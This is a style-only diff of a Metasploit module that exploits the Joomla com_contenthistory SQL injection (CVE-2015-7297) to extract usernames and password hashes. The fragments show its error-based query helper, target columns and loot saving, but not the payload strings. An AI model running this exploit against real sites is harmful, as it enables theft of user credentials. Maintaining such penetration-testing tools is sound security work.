@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,36 +7,35 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Joomla com_contenthistory Error-Based SQL Injection',
-      'Description'    => %q{
-        This module exploits a SQL injection vulnerability in Joomla versions 3.2
-        through 3.4.4 in order to either enumerate usernames and password hashes.
-      },
-      'References'     =>
-        [
-          ['CVE', '2015-7297'],
-          ['URL', 'https://www.trustwave.com/Resources/SpiderLabs-Blog/Joomla-SQL-Injection-Vulnerability-Exploit-Results-in-Full-Administrative-Access/']
-        ],
-      'Author'         =>
-        [
-          'Asaf Orpani', # discovery
-          'bperry',      # metasploit module
-          'Nixawk'       # module review
-        ],
-      'License'        => MSF_LICENSE,
-      'DisclosureDate' => 'Oct 22 2015'
-    ))
+                      'Name'           => 'Joomla com_contenthistory Error-Based SQL Injection',
+                      'Description'    => %q(
+                        This module exploits a SQL injection vulnerability in Joomla versions 3.2
+                        through 3.4.4 in order to either enumerate usernames and password hashes.
+                      ),
+                      'References'     =>
+                        [
+                          ['CVE', '2015-7297'],
+                          ['URL', 'https://www.trustwave.com/Resources/SpiderLabs-Blog/Joomla-SQL-Injection-Vulnerability-Exploit-Results-in-Full-Administrative-Access/']
+                        ],
+                      'Author'         =>
+                        [
+                          'Asaf Orpani', # discovery
+                          'bperry',      # metasploit module
+                          'Nixawk'       # module review
+                        ],
+                      'License'        => MSF_LICENSE,
+                      'DisclosureDate' => 'Oct 22 2015'))
 
     register_options(
       [
         OptString.new('TARGETURI', [true, 'The relative URI of the Joomla instance', '/'])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def check
@@ -60,13 +60,11 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def request(query, payload, lmark, rmark)
-    query = "#{payload}" % query
+    query = payload.to_s % query
     res = sqli(query)
 
     # Error based SQL Injection
-    if res && res.code == 500 && res.body =~ /#{lmark}(.*)#{rmark}/
-      $1
-    end
+    Regexp.last_match(1) if res && res.code == 500 && res.body =~ /#{lmark}(.*)#{rmark}/
   end
 
   def query_databases(payload, lmark, rmark)
@@ -124,7 +122,7 @@ class MetasploitModule < Msf::Auxiliary
     colc = request(query, payload, lmark, rmark)
     vprint_status(colc)
 
-    valid_cols = [   # joomla_users
+    valid_cols = [ # joomla_users
       'activation',
       'block',
       'email',
@@ -187,7 +185,8 @@ class MetasploitModule < Msf::Auxiliary
           'text/plain',
           datastore['RHOST'],
           cols.to_json,
-          'joomla.users')
+          'joomla.users'
+        )
         print_good('Saved file to: ' + path)
       end
     end
@@ -206,5 +205,4 @@ class MetasploitModule < Msf::Auxiliary
       }
     )
   end
-
 end
